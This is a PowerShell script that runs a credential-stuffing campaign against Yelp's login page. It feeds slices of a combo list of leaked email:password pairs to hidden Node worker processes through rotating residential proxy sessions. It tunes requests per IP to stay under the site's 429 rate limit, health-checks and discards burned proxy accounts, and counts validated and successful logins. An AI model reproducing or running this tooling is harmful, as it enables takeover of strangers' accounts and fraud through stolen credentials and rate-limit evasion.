param(
  [Parameter(Mandatory=$true)][string]$Source,     # combo list
  [Parameter(Mandatory=$true)][string]$PoolFile,   # one "user:pass" proxy account per line
  [int]$Skip = 0,
  [int]$Take = 150,
  [int]$Chunk = 15,          # POST per IP before rotation; 15 keeps under the 429 window
  [int]$Workers = 4,         # 2 was the floor on 4 vCPU/4 GB; this box is 6C/32 GB
  [int]$Pace = 14,
  [int]$MaxAccountTries = 6, # cap health-gate attempts per worker slot
  [string]$ProxyHost = "pr.oxylabs.io",
  [int]$ProxyPort = 7777,
  [string]$OutDir = ".\runs"
)

# Runs a slice of a combo list across the proxy pool, two workers at a time.
# One chunk = one fresh sticky session. Every chunk is health-gated first: a fresh
# session must return 200 on /login/ or the account is skipped for the rest of the run.
# This is what stops one burned account from killing every other wave.
#
# Prints a per-wave and aggregate summary at the end.

$ErrorActionPreference = "Stop"

# Preflight: Node >= 22 and Chrome are required, and so are at least two runway proxies.
$nodeExe = (Get-Command node -ErrorAction SilentlyContinue).Source
if (-not $nodeExe) { throw "node not found on PATH (need Node >= 22)" }
$nodeMajor = [int]((& node -v).TrimStart('v').Split('.')[0])
if ($nodeMajor -lt 22) { throw "Node $nodeMajor is too old; need >= 22" }
$chrome = if ($env:CHROME) { $env:CHROME } else { "C:\Program Files\Google\Chrome\Application\chrome.exe" }
if (-not (Test-Path $chrome)) { throw "Chrome not found at $chrome (set `$env:CHROME)" }

$runner = Join-Path $PSScriptRoot "batch-fast.js"
if (-not (Test-Path $runner)) { throw "runner not found: $runner" }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

$pool = @(Get-Content $PoolFile | Where-Object { $_ -match ':' -and $_.Trim() -ne '' } | ForEach-Object {
  $i = $_.IndexOf(':'); [pscustomobject]@{ user = $_.Substring(0, $i); pass = $_.Substring($i + 1) }
})
if ($pool.Count -lt $Workers) { throw "pool needs at least $Workers accounts" }

$lines = Get-Content $Source | Where-Object { $_ -match ':' -and $_.Trim() -ne '' } | Select-Object -Skip $Skip -First $Take
if ($lines.Count -eq 0) { throw "empty slice" }

$chunks = @()
for ($k = 0; $k -lt $lines.Count; $k += $Chunk) {
  $idx = $chunks.Count
  $path = Join-Path $OutDir ("chunk_{0:d3}.txt" -f $idx)
  $lines | Select-Object -Skip $k -First $Chunk | Set-Content -Encoding ascii $path
  $chunks += $path
}

$stamp = Get-Date -Format "yyyyMMdd-HHmmss"
$wave = 0
$acctIdx = 0
$bad = @{}
$agg = @{ rows = 0; validated = 0; success = 0; closed = 0; unable = 0; link = 0; unknown = 0; r403 = 0; r429 = 0; r407 = 0 }
$t0 = Get-Date

function Test-Account($acc) {
  # A fresh session, one request. 200 = clean, 407 = quota exhausted, anything else = dirty/dead.
  $sess = "p" + (Get-Random -Minimum 100000 -Maximum 999999)
  $cred = $acc.user + "-sessid-" + $sess + "-sesstime-10:" + $acc.pass
  $code = (& curl.exe -s -o NUL -w "%{http_code}" --max-time 35 -x "${ProxyHost}:${ProxyPort}" -U $cred "https://www.yelp.com/login/" 2>$null) -join ""
  if (-not $code) { $code = "000" }
  return $code
}

function Get-CleanAccount {
  for ($try = 0; $try -lt $MaxAccountTries; $try++) {
    if ($acctIdx -ge $pool.Count) { return $null }
    $acc = $pool[$acctIdx]; $acctIdx++
    if ($bad.ContainsKey($acc.user)) { continue }
    $code = Test-Account $acc
    if ($code -eq "200") { return $acc }
    $bad[$acc.user] = $code
    Write-Output ("skip account {0} login={1}" -f $acc.user, $code)
  }
  return $null
}

for ($c = 0; $c -lt $chunks.Count; $c += $Workers) {
  $wave++
  $batch = @()
  $procs = @()
  $used = @()
  for ($w = 0; $w -lt $Workers -and ($c + $w) -lt $chunks.Count; $w++) {
    $acc = Get-CleanAccount
    if (-not $acc) { break }
    $used += $acc.user
    $out = Join-Path $OutDir ("w{0}-{1}.jsonl" -f $wave, $w)
    $env:BID = "$w"; $env:LIST = $chunks[$c + $w]; $env:OUT = $out
    $env:PU_BASE = $acc.user; $env:PW = $acc.pass; $env:PACE = "$Pace"; $env:BUDGET = "$Chunk"
    $procs += Start-Process -FilePath "node" -ArgumentList "`"$runner`"" -WindowStyle Hidden -PassThru
    $batch += $out
    Start-Sleep -Seconds 2
  }
  if ($procs.Count -eq 0) {
    Write-Output ("wave {0} no clean account (tried up to {1}); stopping" -f $wave, $MaxAccountTries)
    break
  }

  foreach ($p in $procs) { try { Wait-Process -Id $p.Id -ErrorAction SilentlyContinue } catch {} }

  $objs = @()
  foreach ($f in $batch) {
    $objs += @(Get-Content $f -ErrorAction SilentlyContinue | ForEach-Object { try { $_ | ConvertFrom-Json } catch {} })
  }
  $j = @($objs | Where-Object { $_.email })
  $agg.rows += $j.Count
  $agg.validated += @($j | Where-Object { $_.validated }).Count
  $agg.success += @($j | Where-Object { $_.success }).Count
  $agg.closed += @($j | Where-Object { $_.closed }).Count
  $agg.unable += @($j | Where-Object { $_.unable }).Count
  $agg.link += @($j | Where-Object { $_.link }).Count
  $agg.unknown += @($j | Where-Object { $_.unknown }).Count
  $agg.r403 += @($j | Where-Object { $_.status -eq 403 }).Count
  $agg.r429 += @($objs | Where-Object { $_.event -eq 'r429' }).Count
  $agg.r407 += @($j | Where-Object { $_.status -eq 407 }).Count
  $el = [math]::Round(((Get-Date) - $t0).TotalSeconds)
  Write-Output ("wave {0} accounts={1} rows={2} validated={3} success={4} closed={5} 403={6} 429={7} 407={8} elapsed={9}s" -f $wave, ($used -join ","), $agg.rows, $agg.validated, $agg.success, $agg.closed, $agg.r403, $agg.r429, $agg.r407, $el)
}

$el = [math]::Round(((Get-Date) - $t0).TotalSeconds)
$rate = if ($el -gt 0) { [math]::Round(60.0 * $agg.rows / $el, 1) } else { 0 }
Write-Output ""
Write-Output ("TOTAL rows={0} validated={1} success={2} closed={3} unable={4} link={5} unknown={6} 403={7} 429={8} 407={9}" -f $agg.rows, $agg.validated, $agg.success, $agg.closed, $agg.unable, $agg.link, $agg.unknown, $agg.r403, $agg.r429, $agg.r407)
Write-Output ("wall={0}s  rate={1} rows/min  skip={2} take={3} chunk={4} workers={5} started={6}" -f $el, $rate, $Skip, $Take, $Chunk, $Workers, $stamp)
